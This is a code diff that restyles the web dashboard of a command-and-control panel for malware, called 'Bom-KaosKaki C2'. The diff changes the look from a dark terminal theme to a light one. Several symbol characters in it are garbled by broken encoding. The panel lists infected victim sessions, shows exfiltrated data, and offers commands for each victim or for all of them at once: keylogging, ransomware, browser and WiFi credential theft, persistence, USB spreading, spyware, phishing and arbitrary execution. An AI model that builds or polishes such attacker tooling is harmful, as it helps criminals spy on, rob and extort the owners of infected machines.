@@ -1,11 +1,11 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bom-KaosKaki C2 Dashboard</title>
-    <style>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"><style>
         * {
             margin: 0;
             padding: 0;
@@ -13,16 +13,16 @@
         }
 
         body {
-            background: #000;
-            color: #fff;
-            font-family: 'Courier New', monospace;
+            background: #f8f9fa;
+            color: #333;
+            font-family: 'Inter', -apple-system, sans-serif;
             font-size: 14px;
             line-height: 1.6;
             padding: 20px;
         }
 
         .header {
-            border-bottom: 2px solid #fff;
+            border-bottom: 2px solid #e9ecef;
             padding-bottom: 10px;
             margin-bottom: 20px;
             display: flex;
@@ -48,7 +48,7 @@
         }
 
         .stat-box {
-            border: 1px solid #333;
+            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
             padding: 10px 15px;
             min-width: 120px;
         }
@@ -70,7 +70,7 @@
             font-weight: bold;
             margin-bottom: 10px;
             padding-bottom: 5px;
-            border-bottom: 1px solid #333;
+            border-bottom: 1px solid #e9ecef;
         }
 
         table {
@@ -82,71 +82,71 @@
 
         th,
         td {
-            border: 1px solid #333;
+            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
             padding: 6px 8px;
             text-align: left;
         }
 
         th {
-            background: #111;
-            color: #0f0;
+            background: #f8f9fa;
+            color: #555;
             font-size: 11px;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
 
         tr:hover {
-            background: #0a0a0a;
+            background: #f1f3f5;
         }
 
         .status-active {
-            color: #0f0;
+            color: #555;
         }
 
         .status-idle {
-            color: #ff0;
+            color: #f57c00;
         }
 
         .status-dead {
-            color: #f00;
+            color: #d32f2f;
         }
 
         .status-completed {
-            color: #0f0;
+            color: #555;
         }
 
         .status-pending {
-            color: #ff0;
+            color: #f57c00;
         }
 
         .status-error {
-            color: #f00;
+            color: #d32f2f;
         }
 
         code {
-            font-family: 'Courier New', monospace;
+            font-family: 'Inter', -apple-system, sans-serif;
         }
 
         .session-id {
-            color: #88f;
+            color: #00a4ef;
         }
 
         button,
         select,
         input,
         textarea {
-            background: #000;
-            color: #fff;
-            border: 1px solid #333;
+            background: #f8f9fa;
+            color: #333;
+            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
             padding: 4px 8px;
-            font-family: 'Courier New', monospace;
+            font-family: 'Inter', -apple-system, sans-serif;
             font-size: 12px;
             cursor: pointer;
         }
 
         button:hover {
-            background: #111;
-            border-color: #0f0;
+            background: #f8f9fa;
+            border-color: #555;
         }
 
         button:active {
@@ -155,15 +155,15 @@
         }
 
         select option {
-            background: #000;
-            color: #fff;
+            background: #f8f9fa;
+            color: #333;
         }
 
         input:focus,
         textarea:focus,
         select:focus {
             outline: none;
-            border-color: #0f0;
+            border-color: #555;
         }
 
         textarea {
@@ -189,7 +189,7 @@
         }
 
         .modal {
-            background: #000;
+            background: #f8f9fa;
             border: 2px solid #333;
             padding: 20px;
             min-width: 500px;
@@ -199,7 +199,7 @@
         .modal h2 {
             font-size: 16px;
             margin-bottom: 15px;
-            border-bottom: 1px solid #333;
+            border-bottom: 1px solid #e9ecef;
             padding-bottom: 8px;
         }
 
@@ -228,28 +228,28 @@
             display: flex;
             gap: 0;
             margin-bottom: 15px;
-            border-bottom: 1px solid #333;
+            border-bottom: 1px solid #e9ecef;
         }
 
         .tab-btn {
             padding: 8px 16px;
-            border: 1px solid #333;
-            border-bottom: none;
-            background: #000;
+            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            border-bottom: 2px solid transparent;
+            background: #f8f9fa;
             color: #888;
             cursor: pointer;
-            font-family: 'Courier New', monospace;
+            font-family: 'Inter', -apple-system, sans-serif;
             font-size: 12px;
         }
 
-        .tab-btn.active {
-            background: #111;
-            color: #0f0;
-            border-color: #0f0;
+        .tab-btn.active { border-bottom-color: #00a4ef; color: #00a4ef;
+            background: #f8f9fa;
+            color: #555;
+            border-color: #555;
         }
 
         .tab-btn:hover {
-            color: #fff;
+            color: #333;
         }
 
         .tab-content {
@@ -261,7 +261,7 @@
         }
 
         .exfil-item {
-            border: 1px solid #333;
+            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
             padding: 8px;
             margin-bottom: 8px;
             font-size: 12px;
@@ -278,15 +278,15 @@
         }
 
         .exfil-item .header .type {
-            color: #88f;
+            color: #00a4ef;
             font-weight: bold;
         }
 
         .exfil-item pre {
-            background: #0a0a0a;
+            background: #f1f3f5;
             padding: 8px;
             font-size: 11px;
-            color: #0f0;
+            color: #555;
             overflow-x: auto;
             max-height: 150px;
             overflow-y: auto;
@@ -296,18 +296,18 @@
         .exfil-item img {
             max-width: 200px;
             max-height: 150px;
-            border: 1px solid #333;
+            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
             cursor: pointer;
             margin-top: 5px;
         }
 
         .exfil-item img:hover {
-            border-color: #0f0;
+            border-color: #555;
         }
 
         .console-log {
-            background: #0a0a0a;
-            border: 1px solid #333;
+            background: #f1f3f5;
+            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
             padding: 10px;
             max-height: 300px;
             overflow-y: auto;
@@ -325,15 +325,15 @@
         }
 
         .console-log .info {
-            color: #0f0;
+            color: #555;
         }
 
         .console-log .error {
-            color: #f00;
+            color: #d32f2f;
         }
 
         .console-log .warn {
-            color: #ff0;
+            color: #f57c00;
         }
 
         ::-webkit-scrollbar {
@@ -341,7 +341,7 @@
         }
 
         ::-webkit-scrollbar-track {
-            background: #000;
+            background: #f8f9fa;
         }
 
         ::-webkit-scrollbar-thumb {
@@ -360,7 +360,7 @@
         }
 
         .toast {
-            border: 1px solid #333;
+            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
             padding: 10px 15px;
             margin-bottom: 8px;
             font-size: 12px;
@@ -368,27 +368,27 @@
         }
 
         .toast.success {
-            border-color: #0f0;
+            border-color: #555;
         }
 
         .toast.error {
-            border-color: #f00;
+            border-color: #d32f2f;
         }
 
         .toast.warn {
-            border-color: #ff0;
+            border-color: #f57c00;
         }
 
         .toast.info {
-            border-color: #88f;
+            border-color: #00a4ef;
         }
 
         .dropdown {
-            background: #000;
-            color: #fff;
-            border: 1px solid #333;
+            background: #f8f9fa;
+            color: #333;
+            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
             padding: 3px 5px;
-            font-family: 'Courier New', monospace;
+            font-family: 'Inter', -apple-system, sans-serif;
             font-size: 11px;
         }
     </style>
@@ -431,15 +431,15 @@
         <div class="tab-btn" onclick="switchTab('exfil')">[ Exfiltrated ]</div>
         <div class="tab-btn" onclick="switchTab('console')">[ Console ]</div>
         <div style="flex-grow:1;"></div>
-        <button onclick="refreshAll()" style="border-color:#555;">⟳ Refresh</button>
+        <button onclick="refreshAll()" style="border-color:#555;">âŸ³ Refresh</button>
     </div>
 
     <!-- TAB: AGENTS -->
     <div class="tab-content active" id="tab-agents">
         <div class="section-title">
             ACTIVE SESSIONS
-            <button onclick="sendCommandToAll()" style="margin-left:10px;border-color:#88f;">▶ Command to All</button>
-            <button onclick="loadAgents()" style="margin-left:5px;">⟳</button>
+            <button onclick="sendCommandToAll()" style="margin-left:10px;border-color:#88f;">â–¶ Command to All</button>
+            <button onclick="loadAgents()" style="margin-left:5px;">âŸ³</button>
         </div>
         <table>
             <thead>
@@ -525,7 +525,7 @@
     <!-- COMMAND MODAL -->
     <div class="modal-overlay" id="commandModal">
         <div class="modal">
-            <h2 id="modalTitle">▶ Send Command</h2>
+            <h2 id="modalTitle">â–¶ Send Command</h2>
 
             <input type="hidden" id="cmdSessionId">
             <input type="hidden" id="cmdIsAll">
@@ -569,7 +569,7 @@
 
             <div class="btn-row">
                 <button onclick="closeModal('commandModal')">Cancel</button>
-                <button onclick="executeCommand()" style="border-color:#0f0;">▶ Execute</button>
+                <button onclick="executeCommand()" style="border-color:#0f0;">â–¶ Execute</button>
             </div>
         </div>
     </div>
@@ -667,29 +667,29 @@
                     <td>${a.username || '?'}</td>
                     <td>${(a.os || '?').substring(0, 30)}</td>
                     <td>${a.ip || '?'}</td>
-                    <td>${a.isAdmin ? '✓' : ''}</td>
+                    <td>${a.isAdmin ? 'âœ“' : ''}</td>
                     <td style="color:#555;font-size:11px;">${timeAgo}</td>
                     <td class="${cls}">${status}</td>
                     <td>
                         <select class="dropdown" id="cmd-${a.sessionId}" style="margin-bottom:2px;">
-                            <option value="screenshot">📷 Screenshot</option>
-                            <option value="keylogger">⌨ Keylogger</option>
-                            <option value="stop_keylogger">⏹ Stop Keylogger</option>
-                            <option value="ransomware">💀 Ransomware</option>
-                            <option value="clipboard">📋 Clipboard</option>
-                            <option value="system_info">ℹ System Info</option>
-                            <option value="steal_wifi">📡 WiFi</option>
-                            <option value="steal_browser">🌐 Browser</option>
-                            <option value="persistence">🔗 Persistence</option>
-                            <option value="spread">💾 USB Spread</option>
-                            <option value="spyware">👁 Spyware</option>
-                            <option value="phishing">🎣 Phishing</option>
-                            <option value="clean">🧹 Clean</option>
-                            <option value="exec">⚡ Exec</option>
-                            <option value="uninstall">❌ Uninstall</option>
+                            <option value="screenshot">ðŸ“· Screenshot</option>
+                            <option value="keylogger">âŒ¨ Keylogger</option>
+                            <option value="stop_keylogger">â¹ Stop Keylogger</option>
+                            <option value="ransomware">ðŸ’€ Ransomware</option>
+                            <option value="clipboard">ðŸ“‹ Clipboard</option>
+                            <option value="system_info">â„¹ System Info</option>
+                            <option value="steal_wifi">ðŸ“¡ WiFi</option>
+                            <option value="steal_browser">ðŸŒ Browser</option>
+                            <option value="persistence">ðŸ”— Persistence</option>
+                            <option value="spread">ðŸ’¾ USB Spread</option>
+                            <option value="spyware">ðŸ‘ Spyware</option>
+                            <option value="phishing">ðŸŽ£ Phishing</option>
+                            <option value="clean">ðŸ§¹ Clean</option>
+                            <option value="exec">âš¡ Exec</option>
+                            <option value="uninstall">âŒ Uninstall</option>
                         </select>
-                        <button onclick="quickCmd('${a.sessionId}')" style="font-size:11px;padding:2px 6px;">▶</button>
-                        <button onclick="openCmdModal('${a.sessionId}')" style="font-size:11px;padding:2px 6px;" title="Advanced">⚙</button>
+                        <button onclick="quickCmd('${a.sessionId}')" style="font-size:11px;padding:2px 6px;">â–¶</button>
+                        <button onclick="openCmdModal('${a.sessionId}')" style="font-size:11px;padding:2px 6px;" title="Advanced">âš™</button>
                     </td>
                 </tr>`;
                     }).join('');
@@ -735,7 +735,7 @@
                 });
                 const d = await r.json();
                 if (d.success) {
-                    showToast('▶ ' + type + ' sent to ' + sessionId.substring(0, 8) + '...', 'success');
+                    showToast('â–¶ ' + type + ' sent to ' + sessionId.substring(0, 8) + '...', 'success');
                     log('Sent [' + type + '] to ' + sessionId, 'info');
                     loadCommands();
                 } else {
@@ -751,7 +751,7 @@
             document.getElementById('cmdSessionId').value = sessionId;
             document.getElementById('cmdIsAll').value = 'false';
             document.getElementById('cmdTargetDisplay').value = sessionId;
-            document.getElementById('modalTitle').textContent = '▶ Send Command to ' + sessionId.substring(0, 12) + '...';
+            document.getElementById('modalTitle').textContent = 'â–¶ Send Command to ' + sessionId.substring(0, 12) + '...';
             document.getElementById('cmdType').value = 'exec';
             document.getElementById('cmdExecScript').value = '';
             document.getElementById('cmdScheduledTime').value = '';
@@ -763,7 +763,7 @@
             document.getElementById('cmdSessionId').value = 'all';
             document.getElementById('cmdIsAll').value = 'true';
             document.getElementById('cmdTargetDisplay').value = 'ALL ACTIVE AGENTS';
-            document.getElementById('modalTitle').textContent = '▶ Send Command to ALL Agents';
+            document.getElementById('modalTitle').textContent = 'â–¶ Send Command to ALL Agents';
             document.getElementById('cmdType').value = 'exec';
             document.getElementById('cmdExecScript').value = '';
             document.getElementById('cmdScheduledTime').value = '';
@@ -801,7 +801,7 @@
                 });
                 const d = await r.json();
                 if (d.success) {
-                    showToast('▶ ' + type + ' sent! ID: ' + d.command_id.substring(0, 12) + '...', 'success');
+                    showToast('â–¶ ' + type + ' sent! ID: ' + d.command_id.substring(0, 12) + '...', 'success');
                     log('Sent [' + type + '] to ' + sessionId + ' (ID: ' + d.command_id + ')', 'info');
                     closeModal('commandModal');
                     loadCommands();
@@ -927,3 +927,4 @@
 </body>
 
 </html>
+
